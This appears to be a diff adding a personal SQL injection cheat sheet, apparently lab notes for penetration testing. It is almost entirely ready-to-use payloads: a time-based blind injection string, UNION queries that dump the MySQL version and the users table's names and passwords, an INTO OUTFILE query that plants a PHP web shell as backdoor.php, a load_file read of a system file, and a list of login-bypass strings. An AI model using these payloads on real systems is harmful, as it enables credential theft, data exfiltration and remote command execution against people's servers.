@@ -1,0 +1,36 @@
+
+* TIME BASED BLIND SQL INJECTION
+' AND SLEEP(5) AND 'nOVo'='nOVo
+
+
+* Number of Coloumns
+	... order by X
+	- increase X, if error, number of coloumns is X-1
+
+* retrieve data from coloumns
+	union all select 1,2,3,4,5,..,X
+
+* rectrieve MySQL Version
+	union all select 1,2,3,@@version,5
+
+* retrieve MySQL User hashes
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+
+* retrieve MySQL User,Password
+http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users
+
+* Write File to Filesystem
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+* Load File
+union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
+
+
+* Auth Bypass
+' or 1=1 LIMIT 1 --
+' or 1=1 LIMIT 1 -- -
+' or 1=1 LIMIT 1#
+'or 1#
+' or 1=1 --
+' or 1=1 -- -
+
